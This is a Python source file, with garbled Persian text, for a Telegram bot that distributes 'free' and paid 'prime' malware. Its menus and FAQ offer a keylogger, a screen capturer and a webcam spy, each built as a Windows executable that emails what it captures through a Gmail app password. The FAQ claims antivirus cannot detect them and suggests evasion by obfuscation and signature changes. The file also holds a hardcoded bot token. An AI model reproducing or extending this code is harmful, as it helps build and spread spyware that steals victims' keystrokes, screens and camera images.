import zipfile

import cv2
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)
import asyncio
import os
from telegram.error import BadRequest
import subprocess
import sys
import shutil
import tempfile
import os
import sys
import asyncio
import tempfile
import zipfile
from telegram import Update
from telegram.ext import ContextTypes, ConversationHandler
import shutil

# ----------------------------
# ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ø§ÙˆÙ„ÛŒÙ‡ Ø±Ø¨Ø§Øª
# ----------------------------

CHANNEL_USERNAME = "@Malvexe"
YOUR_ADMIN_ID = 6582767033
TOKEN = "7740444426:AAEQGBI6hC3EYLRn2QBNdlYoOqR1s9PMpLo"

# ----------------------------
# Ø­Ø§Ù„Øªâ€ŒÙ‡Ø§ÛŒ Ú¯ÙØªÚ¯Ùˆ
# ----------------------------

GET_SENDER, GET_PASSWORD, GET_RECEIVER = range(3)
GET_WEBCAM_SENDER, GET_WEBCAM_PASSWORD, GET_WEBCAM_RECEIVER = range(3, 6)
GET_KEYLOGGER_SENDER, GET_KEYLOGGER_PASSWORD, GET_KEYLOGGER_RECEIVER, GET_KEYLOGGER_DURATION = range(6, 10)
TIMEOUT = 600  # 10 Ø¯Ù‚ÛŒÙ‚Ù‡ Ø²Ù…Ø§Ù† Ø¨Ø±Ø§ÛŒ Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„

# ----------------------------
# Ø³ÙˆØ§Ù„Ø§Øª Ù…ØªØ¯Ø§ÙˆÙ„ (FAQ)
# ----------------------------

faq_questions = [
    ("Ú†Ø·ÙˆØ± Ø§ÛŒÙ† Ø¨Ø±Ù†Ø§Ù…Ù‡ Ø±Ùˆ Ø§Ø¬Ø±Ø§ Ú©Ù†ÛŒÙ…ØŸ",
     "Ø¨Ø±Ø§ÛŒ Ø§Ø¬Ø±Ø§ÛŒ Ø¨Ø±Ù†Ø§Ù…Ù‡ Ø¯Ø± ÙˆÛŒÙ†Ø¯ÙˆØ²ØŒ Ú©Ø§ÙÛŒ Ø§Ø³Øª ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ Ø±Ø§ Ø¯Ùˆ Ø¨Ø§Ø± Ú©Ù„ÛŒÚ© Ú©Ù†ÛŒØ¯.\n"
     "Ø§Ú¯Ø± Ø®Ø·Ø§ Ø¯Ø§Ø´ØªØŒ Ø¨Ø§ÛŒØ¯ â€.NET Framework ÛŒØ§ Visual C++ Ù†ØµØ¨ Ú©Ù†ÛŒØ¯.\n"
     "Ø¢Ù…ÙˆØ²Ø´ Ú©Ø§Ù…Ù„ Ø§Ø¬Ø±Ø§ Ø¯Ø± Ù†Ø³Ø®Ù‡ Ø±Ø§ÛŒÚ¯Ø§Ù† Ú©Ø§Ù†Ø§Ù„ Ù…ÙˆØ¬ÙˆØ¯ Ø§Ø³Øª."),

    ("Ú†Ø·ÙˆØ± ÙØ§ÛŒÙ„ EXE Ø±Ùˆ ØªØ¨Ø¯ÛŒÙ„ Ú©Ù†ÛŒÙ… Ø¨Ù‡ PDFØŸ",
     "ÙØ§ÛŒÙ„ â€EXE ÛŒÚ© ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ Ø§Ø³Øª Ùˆ â€PDF ÙØ±Ù…Øª Ù…ØªÙ†ÛŒ Ø§Ø³Øª. Ø¨Ù†Ø§Ø¨Ø±Ø§ÛŒÙ† ØªØ¨Ø¯ÛŒÙ„ Ù…Ø³ØªÙ‚ÛŒÙ… Ù…Ù…Ú©Ù† Ù†ÛŒØ³Øª.\n"
     "Ø¢Ù…ÙˆØ²Ø´ Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ù…Ø­ØªÙˆØ§ÛŒ ÙØ§ÛŒÙ„ â€EXE Ø¯Ø± Ù†Ø³Ø®Ù‡ Ù¾Ø±Ø§ÛŒÙ… Ú©Ø§Ù†Ø§Ù„ Ù‚Ø±Ø§Ø± Ø¯Ø§Ø±Ø¯."),

    ("Ù…Ù‡Ù†Ø¯Ø³ÛŒ Ø§Ø¬ØªÙ…Ø§Ø¹ÛŒ Ø±Ùˆ Ø§Ø² Ú©Ø¬Ø§ Ø´Ø±ÙˆØ¹ Ú©Ù†Ù…ØŸ",
     "Ø¨Ø§ Ú©ØªØ§Ø¨â€ŒÙ‡Ø§ÛŒ Ø±ÙˆØ§Ù†Ø´Ù†Ø§Ø³ÛŒ Ùˆ ØªÙ…Ø±ÛŒÙ† Ø¯Ø± Ù…Ø­ÛŒØ·â€ŒÙ‡Ø§ÛŒ Ú©Ù†ØªØ±Ù„â€ŒØ´Ø¯Ù‡ Ø´Ø±ÙˆØ¹ Ú©Ù†.\n"
     "Ù…Ù‚Ø§Ù„Ø§Øª Ø§Ø¨ØªØ¯Ø§ÛŒÛŒ Ø¯Ø± Ù†Ø³Ø®Ù‡ Ø±Ø§ÛŒÚ¯Ø§Ù† Ú©Ø§Ù†Ø§Ù„ Ù‚Ø±Ø§Ø± Ø¯Ø§Ø±Ø¯."),

    ("Ø¢ÛŒØ§ Ù¾Ø³ÙˆØ±Ø¯ Ø§ØµÙ„ÛŒ Ø§ÛŒÙ…ÛŒÙ„Ù… Ø±Ùˆ Ù†ÛŒØ§Ø² Ø¯Ø§Ø±Ù…ØŸ",
     "Ø®ÛŒØ±! ÙÙ‚Ø· Ø¨Ù‡ Ù¾Ø³ÙˆØ±Ø¯ Ù…Ø®ØµÙˆØµ Ø§Ù¾Ù„ÛŒÚ©ÛŒØ´Ù† (App Password) Ù†ÛŒØ§Ø² Ø¯Ø§Ø±ÛŒØ¯ Ú©Ù‡:\n"
     "1. Ø§Ø² Ø·Ø±ÛŒÙ‚ ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ø§Ù…Ù†ÛŒØªÛŒ Ú¯ÛŒÙ…ÛŒÙ„ Ù‚Ø§Ø¨Ù„ Ø³Ø§Ø®Øª Ø§Ø³Øª\n"
     "2. Ø¯Ø³ØªØ±Ø³ÛŒ Ù…Ø­Ø¯ÙˆØ¯ Ø¯Ø§Ø±Ø¯\n"
     "3. Ù‚Ø§Ø¨Ù„ ØºÛŒØ±ÙØ¹Ø§Ù„ Ú©Ø±Ø¯Ù† Ø§Ø³Øª\n"
     "4. Ø¨Ø§ Ù¾Ø³ÙˆØ±Ø¯ Ø§ØµÙ„ÛŒ Ø­Ø³Ø§Ø¨ ØªÙØ§ÙˆØª Ø¯Ø§Ø±Ø¯"),

    ("Ú†Ø·ÙˆØ± App Password Ø¨Ø³Ø§Ø²Ù…ØŸ",
     "Ø±Ø§Ù‡Ù†Ù…Ø§ÛŒ ØªØµÙˆÛŒØ±ÛŒ Ø¯Ø± Ú©Ø§Ù†Ø§Ù„ Ù…ÙˆØ¬ÙˆØ¯ Ø§Ø³Øª:\n"
     "1. ÙˆØ§Ø±Ø¯ Ø­Ø³Ø§Ø¨ Ú¯ÙˆÚ¯Ù„ Ø´ÙˆÛŒØ¯\n"
     "2. Ø¨Ù‡ Ø¨Ø®Ø´ Security > Signing in to Google Ø¨Ø±ÙˆÛŒØ¯\n"
     "3. Ú¯Ø²ÛŒÙ†Ù‡ App Passwords Ø±Ø§ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒØ¯\n"
     "4. ÛŒÚ© Ù†Ø§Ù… Ø¨Ø±Ø§ÛŒ Ø±Ø¨Ø§Øª Ø§Ù†ØªØ®Ø§Ø¨ Ùˆ Ø±Ù…Ø² Ø§ÛŒØ¬Ø§Ø¯ Ø´Ø¯Ù‡ Ø±Ø§ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯"),

    ("Ø¢ÛŒØ§ Ø§ÛŒÙ† Ø±Ø¨Ø§Øª Ø§Ù…Ù† Ø§Ø³ØªØŸ",
     " Ú©Ø§Ù…Ù„Ø§Ù‹ Ø§Ù…Ù† Ø¨Ø±Ø§ÛŒ Ø§Ø³ØªÙØ§Ø¯Ù‡:\n"
     "â€¢ Ú©Ø¯Ù‡Ø§ÛŒ Ø¨Ø§Ø²Ø¨ÛŒÙ†ÛŒ Ø´Ø¯Ù‡\n"
     "â€¢ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² Ù¾Ø±ÙˆØªÚ©Ù„â€ŒÙ‡Ø§ÛŒ Ø§Ù…Ù†\n"
     "â€¢ Ø§Ù…Ú©Ø§Ù† ØºÛŒØ±ÙØ¹Ø§Ù„ Ú©Ø±Ø¯Ù† Ø¯Ø³ØªØ±Ø³ÛŒ Ù¾Ø³ Ø§Ø² Ø§Ø³ØªÙØ§Ø¯Ù‡"),

    ("Ú†Ø·ÙˆØ± Ø§Ø² Ø³ÙˆØ¡Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø¬Ù„ÙˆÚ¯ÛŒØ±ÛŒ Ú©Ù†Ù…ØŸ",
     "â€¢ ÙÙ‚Ø· Ø±ÙˆÛŒ Ø³ÛŒØ³ØªÙ…â€ŒÙ‡Ø§ÛŒ Ø¨Ø§ Ù…Ø¬ÙˆØ² Ø§Ø¬Ø±Ø§ Ú©Ù†ÛŒØ¯\n"
     "â€¢ Ù¾Ø³ Ø§Ø² ØªØ³ØªØŒ App Password Ø±Ø§ ØºÛŒØ±ÙØ¹Ø§Ù„ Ú©Ù†ÛŒØ¯\n"
     "â€¢ Ø§Ø² Ø§Ø¨Ø²Ø§Ø± ÙÙ‚Ø· Ø¨Ø±Ø§ÛŒ Ø§Ù‡Ø¯Ø§Ù Ù‚Ø§Ù†ÙˆÙ†ÛŒ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯\n"
     "â€¢ Ø¢Ù…ÙˆØ²Ø´ Ú©Ø§Ù…Ù„ Ø§Ø®Ù„Ø§Ù‚ Ø­Ø±ÙÙ‡â€ŒØ§ÛŒ Ø¯Ø± Ú©Ø§Ù†Ø§Ù„"),

    ("Ø¢ÛŒØ§ Ø¢Ù†ØªÛŒâ€ŒÙˆÛŒØ±ÙˆØ³ Ø§ÛŒÙ† ÙØ§ÛŒÙ„ Ø±Ø§ Ù¾Ø§Ú© Ù…ÛŒâ€ŒÚ©Ù†Ø¯ØŸ",
     " Ø®ÛŒØ± ÙÙ‚Ø· Ù…Ù…Ú©Ù† Ø§Ø³Øª Ø¨Ø±Ø®ÛŒ Ø¢Ù†ØªÛŒâ€ŒÙˆÛŒØ±ÙˆØ³â€ŒÙ‡Ø§ Ù‡Ø´Ø¯Ø§Ø± Ø¯Ù‡Ù†Ø¯ Ø§Ù…Ø§ Ø§ÛŒÙ† ØªØ³Øª Ø´Ø¯Ù‡ Ùˆ ØºÛŒØ±Ù‚Ø§Ø¨Ù„ Ø´Ù†Ø§Ø³Ø§ÛŒÛŒ Ø§Ø³Øª:\n"
     "â€¢ ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ Ø§Ø³Øª\n"
     "â€¢ Ø±ÙØªØ§Ø±Ù‡Ø§ÛŒ Ø³ÛŒØ³ØªÙ…ÛŒ Ø¯Ø§Ø±Ø¯\n"
     ),

    ("Ú†Ø±Ø§ Ø§ÛŒÙ…ÛŒÙ„ Ø§Ø±Ø³Ø§Ù„ÛŒ Ø¯Ø± Ø§Ø³Ù¾Ù… Ù‚Ø±Ø§Ø± Ù…ÛŒâ€ŒÚ¯ÛŒØ±Ø¯ØŸ",
     "Ø¨Ù‡ Ø¯Ù„Ø§ÛŒÙ„ Ø§Ù…Ù†ÛŒØªÛŒ Ú¯ÙˆÚ¯Ù„:\n"
     "1. Ø¨Ù‡ Ø¨Ø®Ø´ Spam Ù…Ø±Ø§Ø¬Ø¹Ù‡ Ú©Ù†ÛŒØ¯\n"
     "2. Ø§ÛŒÙ…ÛŒÙ„ Ø±Ø§ Not Spamæ ‡è®° Ú©Ù†ÛŒØ¯\n"
     "3. Ø¢Ø¯Ø±Ø³ ÙØ±Ø³ØªÙ†Ø¯Ù‡ Ø±Ø§ Ø¨Ù‡ Ù…Ø®Ø§Ø·Ø¨ÛŒÙ† Ø§Ø¶Ø§ÙÙ‡ Ú©Ù†ÛŒØ¯\n"
     "4. Ø§Ø² Ø§ÛŒÙ…ÛŒÙ„ Ø¯ÛŒÚ¯Ø± Ù…Ø§Ù†Ù†Ø¯ Outlookè¯•è¯• Ú©Ù†ÛŒØ¯"),

    ("Ú†Ø·ÙˆØ± Ù„Ø§Ú¯â€ŒÙ‡Ø§ÛŒ Ú©ÛŒÙ„Ø§Ú¯Ø± Ø±Ø§ Ø¨Ø±Ø±Ø³ÛŒ Ú©Ù†Ù…ØŸ",
     "â€¢ ÙØ§ÛŒÙ„ Ù„Ø§Ú¯ Ø¯Ø± C:\\Windows\\Temp\\KeyloggerLogs Ø°Ø®ÛŒØ±Ù‡ Ù…ÛŒâ€ŒØ´ÙˆØ¯\n"
     "â€¢ Ø¨Ù‡ ØµÙˆØ±Øª Ø®ÙˆØ¯Ú©Ø§Ø± Ù¾Ø³ Ø§Ø² Ù…Ø¯Øª Ù…Ø´Ø®Øµ Ù¾Ø§Ú© Ù…ÛŒâ€ŒØ´ÙˆØ¯\n"
     "â€¢ Ø¨Ø±Ø§ÛŒ Ø¨Ø±Ø±Ø³ÛŒ Ø¯Ø³ØªÛŒ Ù…ÛŒâ€ŒØªÙˆØ§Ù†ÛŒØ¯ Ù…Ø³ÛŒØ± Ø±Ø§ Ø¨Ø±Ø±Ø³ÛŒ Ú©Ù†ÛŒØ¯"),

    ("Ø¢ÛŒØ§ Ø±ÙˆÛŒ Ù…Ú© ÛŒØ§ Ù„ÛŒÙ†ÙˆÚ©Ø³ Ú©Ø§Ø± Ù…ÛŒâ€ŒÚ©Ù†Ø¯ØŸ",
     "Ø®ÛŒØ±ØŒ Ø¯Ø± Ø­Ø§Ù„ Ø­Ø§Ø¶Ø± ÙÙ‚Ø· Ø±ÙˆÛŒ ÙˆÛŒÙ†Ø¯ÙˆØ² Ù‚Ø§Ø¨Ù„ Ø§Ø¬Ø±Ø§Ø³Øª.\n"
     "Ù†Ø³Ø®Ù‡â€ŒÙ‡Ø§ÛŒ Ù…Ú© Ùˆ Ù„ÛŒÙ†ÙˆÚ©Ø³ Ø¯Ø± Ø¯Ø³Øª ØªÙˆØ³Ø¹Ù‡ Ø§Ø³Øª.\n"
     "Ø¨Ø±Ø§ÛŒ Ø§Ø·Ù„Ø§Ø¹ Ø§Ø² Ù†Ø³Ø®Ù‡â€ŒÙ‡Ø§ÛŒ Ø¬Ø¯ÛŒØ¯ Ø¨Ù‡ Ú©Ø§Ù†Ø§Ù„ Ø¨Ù¾ÛŒÙˆÙ†Ø¯ÛŒØ¯"),

    ("Ú†Ø±Ø§ ÙˆØ¨â€ŒÚ©Ù… Ø±ÙˆØ´Ù† Ù…ÛŒâ€ŒØ´ÙˆØ¯ ÙˆÙ„ÛŒ Ø¹Ú©Ø³ Ù†Ù…ÛŒâ€ŒÚ¯ÛŒØ±Ø¯ØŸ",
     "Ù…Ù…Ú©Ù† Ø§Ø³Øª Ø¨Ù‡ Ø¯Ù„Ø§ÛŒÙ„:\n"
     "1. Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ ÙˆØ¨â€ŒÚ©Ù… Ù…Ø³Ø¯ÙˆØ¯ Ø´Ø¯Ù‡\n"
     "2. Ø¨Ø±Ù†Ø§Ù…Ù‡ Ø¯ÛŒÚ¯Ø±ÛŒ Ø§Ø² ÙˆØ¨â€ŒÚ©Ù… Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒâ€ŒÚ©Ù†Ø¯\n"
     "3. Ø¯Ø±Ø§ÛŒÙˆØ±Ù‡Ø§ Ù†ÛŒØ§Ø² Ø¨Ù‡ Ø¨Ø±ÙˆØ²Ø±Ø³Ø§Ù†ÛŒ Ø¯Ø§Ø±Ù†Ø¯\n"
     "4. Ù†ÙˆØ± Ù…Ø­ÛŒØ· Ú©Ø§ÙÛŒ Ù†ÛŒØ³Øª"),

    ("Ú†Ø·ÙˆØ± Ø§Ø² Ø´Ù†Ø§Ø³Ø§ÛŒÛŒ Ø¬Ù„ÙˆÚ¯ÛŒØ±ÛŒ Ú©Ù†Ù…ØŸ",
     "ØªÚ©Ù†ÛŒÚ©â€ŒÙ‡Ø§ÛŒ Ø­Ø±ÙÙ‡â€ŒØ§ÛŒ:\n"
     "â€¢ ØªØºÛŒÛŒØ± Ù†Ø§Ù… ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒ\n"
     "â€¢ ØªØºÛŒÛŒØ± Ø§Ù…Ø¶Ø§ÛŒ Ø¯ÛŒØ¬ÛŒØªØ§Ù„\n"
     "â€¢ Ø§Ø³ØªÙØ§Ø¯Ù‡ Ø§Ø² ØªÚ©Ù†ÛŒÚ©â€ŒÙ‡Ø§ÛŒ Obfuscation\n"
     "Ø¢Ù…ÙˆØ²Ø´ Ù¾ÛŒØ´Ø±ÙØªÙ‡ Ø¯Ø± Ù†Ø³Ø®Ù‡ Ù¾Ø±Ø§ÛŒÙ…"),

    ("Ø¢ÛŒØ§ Ù…ÛŒâ€ŒØªÙˆØ§Ù†Ù… Ù…Ø¯Øª Ú©ÛŒÙ„Ø§Ú¯Ø± Ø±Ø§ Ø§ÙØ²Ø§ÛŒØ´ Ø¯Ù‡Ù…ØŸ",
     "Ø¨Ù„Ù‡ØŒ Ù‡Ù†Ú¯Ø§Ù… Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„ Ù…ÛŒâ€ŒØªÙˆØ§Ù†ÛŒØ¯:\n"
     "1. Ù…Ø¯Øª Ø²Ù…Ø§Ù† Ø±Ø§ Ø¨Ù‡ Ø«Ø§Ù†ÛŒÙ‡ ÙˆØ§Ø±Ø¯ Ú©Ù†ÛŒØ¯\n"
     "2. Ø­Ø¯Ø§Ú©Ø«Ø± ØªØ§ 24 Ø³Ø§Ø¹Øª Ø§Ù…Ú©Ø§Ù†Ù¾Ø°ÛŒØ± Ø§Ø³Øª\n"
     "3. Ø¨Ø±Ø§ÛŒ Ø²Ù…Ø§Ù†â€ŒÙ‡Ø§ÛŒ Ø¨ÛŒØ´ØªØ± Ù†Ø³Ø®Ù‡ Ù¾Ø±Ø§ÛŒÙ… Ø±Ø§ ØªÙ‡ÛŒÙ‡ Ú©Ù†ÛŒØ¯"),
]


# ----------------------------
# ØªØ¹Ø±ÛŒÙ Ú©ÛŒØ¨ÙˆØ±Ø¯ Ù…Ù†ÙˆÛŒ Ø§ØµÙ„ÛŒ
# ----------------------------

def main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("ğŸ’¬ Ø³ÙˆØ§Ù„Ø§Øª Ù…ØªØ¯Ø§ÙˆÙ„", callback_data='faq_start')],
        [InlineKeyboardButton("ğŸ›  Ù…Ø§Ù„ÙˆØ± Ø±Ø§ÛŒÚ¯Ø§Ù†", callback_data='free_malware')],
        [InlineKeyboardButton("ğŸ” Ù…Ø§Ù„ÙˆØ± Ù¾Ø±Ø§ÛŒÙ…", callback_data='prime_malware')],
        [InlineKeyboardButton("ğŸ’° Ø®Ø±ÛŒØ¯ Ù¾Ø±Ø§ÛŒÙ…", callback_data='buy_prime')],
        [InlineKeyboardButton("âŒ Ú©Ù†Ø³Ù„", callback_data='cancel')],
    ]
    return InlineKeyboardMarkup(keyboard)


# ----------------------------
# Ú©ÛŒØ¨ÙˆØ±Ø¯ Ø³ÙˆØ§Ù„Ø§Øª Ù…ØªØ¯Ø§ÙˆÙ„
# ----------------------------

def faq_keyboard():
    keyboard = [
        [InlineKeyboardButton("âª Ø¨Ø±Ú¯Ø´Øª", callback_data='back_to_main')],
        [InlineKeyboardButton("âŒ Ú©Ù†Ø³Ù„", callback_data='cancel')],
    ]
    return InlineKeyboardMarkup(keyboard)


# ----------------------------
# Ú©ÛŒØ¨ÙˆØ±Ø¯ Ø§Ø¨Ø²Ø§Ø±Ù‡Ø§ÛŒ Ø±Ø§ÛŒÚ¯Ø§Ù†
# ----------------------------

def free_malware_keyboard():
    keyboard = [
        [InlineKeyboardButton("ğŸ“¥ Ú©ÛŒâ€ŒÙ„Ø§Ú¯Ø± Ø±Ø§ÛŒÚ¯Ø§Ù†", callback_data='free_keylogger')],
        [InlineKeyboardButton("ğŸ“¸ Ø§Ø³Ú©Ø±ÛŒÙ†â€ŒØ´Ø§Øª Ø±Ø§ÛŒÚ¯Ø§Ù†", callback_data='free_screenshot')],
        [InlineKeyboardButton("ğŸ¥ ÙˆØ¨â€ŒÚ©Ù… Ø±Ø§ÛŒÚ¯Ø§Ù†", callback_data='free_webcam')],
        [InlineKeyboardButton("âª Ø¨Ø±Ú¯Ø´Øª", callback_data='back_to_main')],
    ]
    return InlineKeyboardMarkup(keyboard)


# ----------------------------
# Ù‡Ù†Ø¯Ù„Ø± Ø¯Ø³ØªÙˆØ± /start
# ----------------------------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    try:
        member = await context.bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if member.status not in ['member', 'administrator', 'creator']:
            await update.message.reply_text(
                f"âŒ Ø´Ù…Ø§ Ø¹Ø¶Ùˆ Ú©Ø§Ù†Ø§Ù„ Ù†ÛŒØ³ØªÛŒØ¯.\n"
                f"Ù„Ø·ÙØ§ Ø§Ø¨ØªØ¯Ø§ Ø¹Ø¶Ùˆ Ú©Ø§Ù†Ø§Ù„ Ø´ÙˆÛŒØ¯:\n{CHANNEL_USERNAME}\n\n"
                "Ø³Ù¾Ø³ Ù…Ø¬Ø¯Ø¯Ø§ /start Ø±Ø§ Ø§Ø±Ø³Ø§Ù„ Ú©Ù†ÛŒØ¯."
            )
            return
    except BadRequest:
        await update.message.reply_text(
            f"âŒ Ø®Ø·Ø§ Ø¯Ø± Ø¨Ø±Ø±Ø³ÛŒ Ø¹Ø¶ÙˆÛŒØª. Ù„Ø·ÙØ§ Ù…Ø·Ù…Ø¦Ù† Ø´ÙˆÛŒØ¯ Ú©Ù‡ Ø¹Ø¶Ùˆ Ú©Ø§Ù†Ø§Ù„ Ù‡Ø³ØªÛŒØ¯:\n{CHANNEL_USERNAME}\n\n"
            "Ùˆ Ø³Ù¾Ø³ /start Ø±Ø§ Ø§Ø±Ø³Ø§Ù„ Ú©Ù†ÛŒØ¯."
        )
        return

    await update.message.reply_text(
        "Ø¨Ù‡ Ø±Ø¨Ø§Øª Ø®ÙˆØ´ Ø§ÙˆÙ…Ø¯ÛŒ!\n\n"
        "ğŸ”¸ Ø¯Ø± Ø§ÛŒÙ†Ø¬Ø§ Ù…ÛŒâ€ŒØªÙˆÙ†ÛŒ Ú¯Ø²ÛŒÙ†Ù‡â€ŒÙ‡Ø§ÛŒ Ù…Ø®ØªÙ„Ù Ø±Ùˆ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†ÛŒ:\n\n"
        "ğŸ’¬ Ø³ÙˆØ§Ù„Ø§Øª Ù…ØªØ¯Ø§ÙˆÙ„\n"
        "ğŸ›  Ù…Ø§Ù„ÙˆØ± Ø±Ø§ÛŒÚ¯Ø§Ù†\n"
        "ğŸ” Ù…Ø§Ù„ÙˆØ± Ù¾Ø±Ø§ÛŒÙ…\n"
        "ğŸ’° Ø®Ø±ÛŒØ¯ Ù¾Ø±Ø§ÛŒÙ…\n\n"
        "ğŸ‘‡ ÛŒÚ©ÛŒ Ø§Ø² Ú¯Ø²ÛŒÙ†Ù‡â€ŒÙ‡Ø§ÛŒ Ø²ÛŒØ± Ø±Ùˆ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†:",
        reply_markup=main_menu_keyboard()
    )


# ----------------------------
# Ù‡Ù†Ø¯Ù„Ø± Ø¯Ú©Ù…Ù‡â€ŒÙ‡Ø§ÛŒ Ø§ÛŒÙ†Ù„Ø§ÛŒÙ† Ú©ÛŒØ¨ÙˆØ±Ø¯
# ----------------------------

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data

    if data == 'faq_start':
        text = "ğŸ“š Ø³ÙˆØ§Ù„Ø§Øª Ù…ØªØ¯Ø§ÙˆÙ„:\n\n"
        for q, a in faq_questions:
            text += f"â“ {q}\n{a}\n\n"
        await query.edit_message_text(text, reply_markup=faq_keyboard())

    elif data == 'back_to_main':
        await query.edit_message_text(
            "ÛŒÚ©ÛŒ Ø§Ø² Ú¯Ø²ÛŒÙ†Ù‡â€ŒÙ‡Ø§ÛŒ Ø²ÛŒØ± Ø±Ùˆ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†:",
            reply_markup=main_menu_keyboard()
        )

    elif data == 'cancel':
        try:
            await query.message.delete()
        except:
            pass

    elif data == 'free_malware':
        await query.edit_message_text(
            "ğŸ›  Ù„ÛŒØ³Øª Ø§Ø¨Ø²Ø§Ø±Ù‡Ø§ÛŒ Ø±Ø§ÛŒÚ¯Ø§Ù†:\n\n"
            "ğŸ“Œ Ú©ÛŒâ€ŒÙ„Ø§Ú¯Ø± Ù‡Ù…ÛŒØ´Ú¯ÛŒ\n"
            "ğŸ“Œ Ø§Ø³Ú©Ø±ÛŒÙ†â€ŒØ´Ø§Øª Ø®ÙˆØ¯Ú©Ø§Ø±\n"
            "ğŸ“Œ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ ÙˆØ¨â€ŒÚ©Ù…\n\n"
            "ğŸ‘‡ ÛŒÚ©ÛŒ Ø±Ùˆ Ø§Ù†ØªØ®Ø§Ø¨ Ú©Ù†:",
            reply_markup=free_malware_keyboard()
        )

    elif data == 'free_screenshot':
        await query.edit_message_text(
            "ğŸ“¸ Ø§Ø³Ú©Ø±ÛŒÙ†â€ŒØ´Ø§Øª Ø±Ø§ÛŒÚ¯Ø§Ù†:\n\n"
            "Ø§ÛŒÙ† Ù†Ø±Ù…â€ŒØ§ÙØ²Ø§Ø± Ø¨Ù‡ ØµÙˆØ±Øª Ø®ÙˆØ¯Ú©Ø§Ø± Ø§Ø² ØµÙØ­Ù‡ Ù†Ù…Ø§ÛŒØ´ Ø¹Ú©Ø³ Ù…ÛŒâ€ŒÚ¯ÛŒØ±Ø¯.\n"
            "Ø¹Ú©Ø³â€ŒÙ‡Ø§ Ø¨Ù‡ Ø§ÛŒÙ…ÛŒÙ„ Ø´Ù…Ø§ Ø§Ø±Ø³Ø§Ù„ Ù…ÛŒâ€ŒØ´ÙˆÙ†Ø¯.\n\n"
            "Ø¨Ø±Ø§ÛŒ Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒØŒ Ù„Ø·ÙØ§Ù‹ Ø§ÛŒÙ…ÛŒÙ„ ÙØ±Ø³ØªÙ†Ø¯Ù‡ (Gmail) Ø±Ø§ Ø§Ø±Ø³Ø§Ù„ Ú©Ù†ÛŒØ¯:"
        )
        return GET_SENDER

    elif data == 'free_keylogger':
        await query.edit_message_text(
            "ğŸ“¥ Ú©ÛŒâ€ŒÙ„Ø§Ú¯Ø± Ø±Ø§ÛŒÚ¯Ø§Ù†:\n\n"
            "Ø§ÛŒÙ† Ø§Ø¨Ø²Ø§Ø± Ù‡Ù…Ù‡ Ú©Ù„ÛŒØ¯Ù‡Ø§ÛŒ ØªØ§ÛŒÙ¾ Ø´Ø¯Ù‡ Ø±Ø§ Ø«Ø¨Øª Ù…ÛŒâ€ŒÚ©Ù†Ø¯.\n\n"
            "Ø¨Ø±Ø§ÛŒ Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒØŒ Ù„Ø·ÙØ§Ù‹ Ø§ÛŒÙ…ÛŒÙ„ ÙØ±Ø³ØªÙ†Ø¯Ù‡ (Gmail) Ø±Ø§ Ø§Ø±Ø³Ø§Ù„ Ú©Ù†ÛŒØ¯:"
        )
        return GET_KEYLOGGER_SENDER

    elif data == 'free_webcam':
        await query.edit_message_text(
            "ğŸ¥ ÙˆØ¨â€ŒÚ©Ù… Ø±Ø§ÛŒÚ¯Ø§Ù†:\n\n"
            "Ø§ÛŒÙ† Ø§Ø¨Ø²Ø§Ø± Ø§Ù…Ú©Ø§Ù† Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ ÙˆØ¨â€ŒÚ©Ù… Ø³ÛŒØ³ØªÙ… Ø±Ø§ ÙØ±Ø§Ù‡Ù… Ù…ÛŒâ€ŒÚ©Ù†Ø¯.\n\n"
            "Ø¨Ø±Ø§ÛŒ Ø³Ø§Ø®Øª ÙØ§ÛŒÙ„ Ø§Ø¬Ø±Ø§ÛŒÛŒØŒ Ù„Ø·ÙØ§Ù‹ Ø§ÛŒÙ…ÛŒÙ„ ÙØ±Ø³ØªÙ†Ø¯Ù‡ (Gmail) Ø±Ø§ Ø§Ø±Ø³Ø§Ù„ Ú©Ù†ÛŒØ¯:"
        )
        return GET_WEBCAM_SENDER

    elif data == 'prime_malware':
        await query.edit_message_text(
            "ğŸ” Ø§Ø¨Ø²Ø§Ø±Ù‡Ø§ÛŒ Ù¾Ø±Ø§ÛŒÙ… (Ù¾ÛŒØ´Ø±ÙØªÙ‡):\n\n"
            "Ø§ÛŒÙ† Ø§Ø¨Ø²Ø§Ø±Ù‡Ø§ ÙÙ‚Ø· Ø¨Ø±Ø§ÛŒ Ø§Ø¹Ø¶Ø§ÛŒ Ù¾Ø±Ø§ÛŒÙ… Ù‚Ø§Ø¨Ù„ Ø¯Ø³ØªØ±Ø³ÛŒ Ù‡Ø³ØªÙ†Ø¯."
        )

    elif data == 'buy_prime':
        await query.edit_message_text(
